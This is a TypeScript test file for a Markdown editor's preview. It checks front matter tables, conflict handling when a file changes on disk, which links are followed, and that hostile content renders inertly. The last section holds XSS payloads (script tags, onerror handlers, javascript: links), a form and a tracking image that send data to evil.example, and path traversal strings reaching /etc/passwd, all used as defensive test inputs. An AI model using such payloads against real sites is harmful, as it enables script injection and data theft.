import "./browser-globals.ts";
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { createElement } from "react";
import { renderToString } from "react-dom/server";
import type { FolderFile } from "../../shared/folder.ts";
import { en } from "../../web/src/i18n/files.ts";
import { registerStrings } from "../../web/src/i18n/index.ts";
import { splitFrontMatter } from "../../web/src/lib/front-matter.ts";
import { conflictDiff, judgeDisk, nextDiskState } from "../../web/src/lib/md-conflict.ts";
import { insideRoot, linkedImage, linkedMarkdown, type MdOpen } from "../../web/src/lib/md-open.ts";
import { installGlobals, restoreGlobals } from "./browser-globals.ts";

// The page's modules read localStorage as they load; load the renderer after the stubs are in place.
installGlobals();
registerStrings("files", en);
const { MdPreview } = await import("../../web/src/components/md/MdPreview.tsx");

/**
 * The Markdown editor (`web/src/components/md/`) where it can be tested without a browser: the front matter it shows as a
 * table, what it does when the file changed on the computer (never write over what the person has not seen), which links
 * and images of a file it follows, and that a hostile file renders as text and nothing that runs or fetches. The editor
 * itself, Mermaid and KaTeX are in `tests/e2e/md-editor.spec.ts`.
 */

beforeAll(installGlobals);
afterAll(restoreGlobals);

describe("front matter", () => {
	test("a YAML block at the top is a table of its keys; the body is what follows it", () => {
		const fm = splitFrontMatter(
			[
				"---",
				'title: "Release notes"',
				"draft: false # not yet",
				"tags: [web, 'ui', docs]",
				"authors:",
				"  - Ada",
				"  - Grace",
				"summary: |",
				"  Two lines",
				"  of text",
				"nested:",
				"  a: 1",
				"  b: two",
				"---",
				"# Heading",
				"",
				"Body.",
			].join("\n"),
		);
		expect(fm.rows).toEqual([
			{ key: "title", value: "Release notes" },
			{ key: "draft", value: "false" },
			{ key: "tags", value: "web, ui, docs" },
			{ key: "authors", value: "Ada, Grace" },
			{ key: "summary", value: "Two lines\nof text" },
			{ key: "nested", value: "a: 1\nb: two" },
		]);
		expect(fm.body).toBe("# Heading\n\nBody.");
		expect(fm.lines).toBe(14);
	});

	test("CRLF lines, a byte order mark, `...` as the closing fence and a file that ends at the fence", () => {
		expect(splitFrontMatter("\ufeff---\r\nname: x\r\n...\r\nbody\r\n")).toEqual({
			rows: [{ key: "name", value: "x" }],
			body: "body\r\n",
			lines: 3,
		});
		expect(splitFrontMatter("---\nname: x\n---")).toEqual({ rows: [{ key: "name", value: "x" }], body: "", lines: 3 });
		expect(splitFrontMatter("---\n---\nbody")).toEqual({ rows: [], body: "body", lines: 2 });
	});

	test("what is not front matter stays Markdown: no fence at the very top, no closing fence, a rule round a paragraph", () => {
		for (const text of [
			"# Title\n---\nkey: v\n---\n",
			"\n---\nkey: v\n---\n",
			"---\nkey: v\nno closing fence",
			"---\njust a paragraph between rules\n---\n",
		]) {
			expect(splitFrontMatter(text)).toEqual({ rows: null, body: text, lines: 0 });
		}
	});
});

const textFile = (etag: string, text: string, extra: Partial<Extract<FolderFile, { kind: "text" }>> = {}) =>
	({
		kind: "text",
		path: "notes.md",
		size: text.length,
		modified: 1,
		local: true,
		text,
		truncated: false,
		view: "markdown",
		etag,
		editable: true,
		...extra,
	}) satisfies FolderFile;

describe("a file that changed on the computer", () => {
	test("the same bytes are the same file, whatever was typed", () => {
		expect(judgeDisk("e1", false, textFile("e1", "a"))).toEqual({ kind: "same" });
		expect(judgeDisk("e1", true, textFile("e1", "a"))).toEqual({ kind: "same" });
	});

	test("with nothing unsaved, what is there is taken (shown read only when it can no longer be saved)", () => {
		const disk = textFile("e2", "theirs");
		expect(judgeDisk("e1", false, disk)).toEqual({ kind: "reload", file: disk });
		const cut = textFile("e3", "cut", { truncated: true, editable: false });
		expect(judgeDisk("e1", false, cut)).toEqual({ kind: "reload", file: cut });
	});

	test("with unsaved text it is a conflict, never taken and never written over: the etag an Overwrite names, the text for the diff", () => {
		expect(judgeDisk("e1", true, textFile("e2", "theirs"))).toEqual({ kind: "conflict", etag: "e2", text: "theirs" });
		// Cut at the read limit: no diff to offer, still a conflict.
		expect(judgeDisk("e1", true, textFile("e2", "the", { truncated: true }))).toEqual({
			kind: "conflict",
			etag: "e2",
			text: null,
		});
	});

	test("a file that is gone, or is no longer text, says so", () => {
		expect(judgeDisk("e1", true, null)).toEqual({ kind: "gone" });
		expect(judgeDisk("e1", false, null)).toEqual({ kind: "gone" });
		const image: FolderFile = { kind: "image", path: "notes.md", size: 4, modified: 2, local: true, mime: "image/png" };
		expect(judgeDisk("e1", true, image)).toEqual({ kind: "unusable" });
	});

	test("a conflict on screen stays while the file stays; one that changed again replaces it (an Overwrite names the newest)", () => {
		const shown = { kind: "conflict", etag: "e2", text: "theirs" } as const;
		expect(nextDiskState(shown, { kind: "conflict", etag: "e2", text: "theirs" })).toBe(shown);
		expect(nextDiskState(shown, { kind: "conflict", etag: "e3", text: "again" })).toEqual({
			kind: "conflict",
			etag: "e3",
			text: "again",
		});
		expect(nextDiskState(shown, { kind: "gone" })).toEqual({ kind: "gone" });
		expect(nextDiskState({ kind: "same" }, { kind: "conflict", etag: "e2", text: "x" })).toEqual({
			kind: "conflict",
			etag: "e2",
			text: "x",
		});
	});

	test("the diff: the file on the computer is the old side, the text being edited the new one, with three lines of context", () => {
		const disk = ["# Title", "one", "two", "three", "four", "five", "six", "seven", "theirs", "end"].join("\n");
		const mine = ["# Title", "one", "two", "three", "four", "five", "six", "seven", "mine", "added", "end"].join("\n");
		const diff = conflictDiff("notes.md", disk, mine);
		expect(diff.view).toBe("text");
		expect(diff.added).toBe(2);
		expect(diff.removed).toBe(1);
		expect(diff.hunks).toHaveLength(1);
		const hunk = diff.hunks[0];
		expect(hunk?.rows.map((r) => `${r.kind}:${r.text}`)).toEqual([
			"ctx:five",
			"ctx:six",
			"ctx:seven",
			"del:theirs",
			"add:mine",
			"add:added",
			"ctx:end",
		]);
		expect(hunk).toMatchObject({ oldStart: 6, oldLines: 5, newStart: 6, newLines: 6 });
		expect(hunk?.rows[3]).toEqual({ kind: "del", old: 9, text: "theirs" });
		expect(hunk?.rows[4]).toEqual({ kind: "add", new: 9, text: "mine" });
		// The same text, line endings aside, has nothing to show.
		expect(conflictDiff("notes.md", "a\r\nb\r\n", "a\nb\n").view).toBe("empty");
		// Two changes far apart are two hunks.
		const long = Array.from({ length: 30 }, (_, i) => `line ${i}`);
		const edited = long.map((l, i) => (i === 2 || i === 25 ? `${l}!` : l));
		expect(conflictDiff("notes.md", long.join("\n"), edited.join("\n")).hunks).toHaveLength(2);
	});
});

describe("links and images of a Markdown file", () => {
	test("a link to a Markdown file of the folder: relative to the file's folder, with its fragment, query and line dropped", () => {
		expect(linkedMarkdown("guide.md", "docs")).toEqual({ kind: "relative", path: "docs/guide.md" });
		expect(linkedMarkdown("../README.md#install", "docs")).toEqual({ kind: "relative", path: "README.md" });
		expect(linkedMarkdown("./a%20b.markdown?x=1", "")).toEqual({ kind: "relative", path: "a b.markdown" });
		expect(linkedMarkdown("docs/guide.md:12:3", "")).toEqual({ kind: "relative", path: "docs/guide.md" });
		expect(linkedMarkdown("/abs/proj/x.md", "")).toEqual({ kind: "absolute", path: "/abs/proj/x.md" });
		expect(linkedMarkdown("file:///abs/proj/x.md", "")).toEqual({ kind: "absolute", path: "/abs/proj/x.md" });
	});

	test("anything else is not followed: another kind of file, a web address, a scheme, a path out of the folder", () => {
		for (const href of [
			"src/app.ts",
			"https://example.com/readme.md",
			"//example.com/readme.md",
			"javascript:alert(1)//.md",
			"data:text/markdown,x.md",
			"#heading",
			"../outside.md",
			"~/notes.md",
			"a\\b.md",
			"%E0%A4%A.md",
			"",
			undefined,
		]) {
			expect({ href, linked: linkedMarkdown(href, "") }).toEqual({ href, linked: null });
		}
		expect(linkedMarkdown("../../up.md", "docs")).toBeNull();
	});

	test("an absolute path opens only inside the conversation's folder", () => {
		expect(insideRoot("/w/proj/docs/a.md", "/w/proj")).toBe("docs/a.md");
		expect(insideRoot("/w/proj/docs/a.md", "/w/proj/")).toBe("docs/a.md");
		expect(insideRoot("/w/project/a.md", "/w/proj")).toBeNull();
		expect(insideRoot("/w/proj/../secret.md", "/w/proj")).toBeNull();
		expect(insideRoot("/w/other/a.md", "/w/proj")).toBeNull();
	});

	test("an image is a file of the folder only by a relative path", () => {
		expect(linkedImage("img/pic.png", "docs")).toBe("docs/img/pic.png");
		expect(linkedImage("../pic.png", "docs")).toBe("pic.png");
		for (const src of [
			"/abs/pic.png",
			"file:///abs/pic.png",
			"https://x.example/p.png",
			"../../p.png",
			"data:image/png;base64,AAAA",
		])
			expect({ src, path: linkedImage(src, "docs") }).toEqual({ src, path: null });
	});
});

describe("what a hostile file renders as", () => {
	const open: MdOpen = { scope: { live: null, file: "/sessions/s.jsonl" }, chatKey: "/sessions/s.jsonl", base: "docs" };
	const html = (text: string) => renderToString(createElement(MdPreview, { text, open, version: 7 }));

	test("HTML in the file is text: no script, no handler, no frame, no form, no style", () => {
		const out = html(
			[
				"<script>alert(1)</script>",
				"",
				'<img src="x" onerror="alert(1)">',
				"",
				'<iframe src="https://evil.example"></iframe>',
				"",
				'<a href="javascript:alert(1)">click</a> <svg onload="alert(1)"></svg>',
				"",
				'<form action="https://evil.example"><input name="q"></form>',
				"",
				"<style>body{display:none}</style>",
			].join("\n"),
		);
		for (const tag of ["<script", "<img", "<iframe", "<a ", "<svg", "<form", "<input", "<style"])
			expect(out).not.toContain(tag);
		// What was written is still there to read, escaped.
		expect(out).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
		expect(out).toContain("onerror");
		// …but as text: no element of the page carries a handler.
		expect(out).not.toMatch(/<[a-z][^>]*\son[a-z]+=/i);
	});

	test("a link with a refused scheme leads nowhere; a web link opens in a window of its own, without a referrer", () => {
		const out = html(
			"[x](javascript:alert(1)) [y](vbscript:msgbox) [d](data:text/html,<script>alert(1)</script>) [web](https://example.com)",
		);
		expect(out).not.toContain("javascript:");
		expect(out).not.toContain("vbscript:");
		expect(out).not.toContain("data:text/html");
		const anchors = [...out.matchAll(/<a [^>]*>/g)].map((m) => m[0]);
		expect(anchors).toHaveLength(1);
		expect(anchors[0]).toContain('href="https://example.com/"');
		expect(anchors[0]).toContain('rel="noreferrer noopener"');
		expect(anchors[0]).toContain('target="_blank"');
	});

	test("an image from elsewhere is never fetched (it is a link); one of the folder is fetched from this server", () => {
		const out = html("![tracker](https://evil.example/p.png?d=secret) ![pic](img/pic.png) ![up](../../../etc/passwd)");
		const images = [...out.matchAll(/<img [^>]*>/g)].map((m) => m[0]);
		expect(images).toHaveLength(1);
		expect(images[0]).toContain(
			'src="/api/folder/raw?file=%2Fsessions%2Fs.jsonl&amp;path=docs%2Fimg%2Fpic.png&amp;v=7"',
		);
		expect(out).not.toContain('src="https://evil.example');
		expect(out).toContain('data-testid="md-image-link"');
		expect(out).not.toContain('passwd"');
	});

	test("a link to another Markdown file of the folder is a button that opens it, not an address", () => {
		const out = html("[guide](guide.md) [readme](../README.md) [out](../../x.md)");
		expect(out).toContain('data-testid="md-open-link" data-path="docs/guide.md"');
		expect(out).toContain('data-path="README.md"');
		expect(out).not.toContain('href="guide.md"');
		expect(out).toContain('<span class="md-ref" title="../../x.md">out</span>');
	});

	test("front matter is a table, not text; GFM tables, task lists, strikethrough and autolinks render", () => {
		const out = html(
			[
				"---",
				"title: <b>bold?</b>",
				"---",
				"| a | b |",
				"| - | - |",
				"| 1 | 2 |",
				"",
				"- [x] done",
				"- [ ] todo",
				"",
				"~~gone~~ www.example.com",
			].join("\n"),
		);
		expect(out).toContain('data-testid="md-front-matter"');
		expect(out).toContain("&lt;b&gt;bold?&lt;/b&gt;");
		expect(out).not.toContain("<b>");
		expect(out).not.toContain("<hr");
		expect(out).toContain("<td>1</td>");
		expect(out).toContain('type="checkbox"');
		expect(out).toContain("<del>gone</del>");
		expect(out).toMatch(/<a href="http:\/\/www\.example\.com\/?" target="_blank" rel="noreferrer noopener">/);
	});

	test("math waits for KaTeX (a status says so); a mermaid block waits for Mermaid, as text until it is drawn", () => {
		const out = html("Euler: $e^{i\\pi} + 1 = 0$\n\n```mermaid\ngraph TD; A-->B\n```\n");
		expect(out).toContain('data-testid="md-math-pending"');
		expect(out).toContain('data-testid="md-mermaid-pending"');
		expect(out).not.toContain("<script");
	});
});
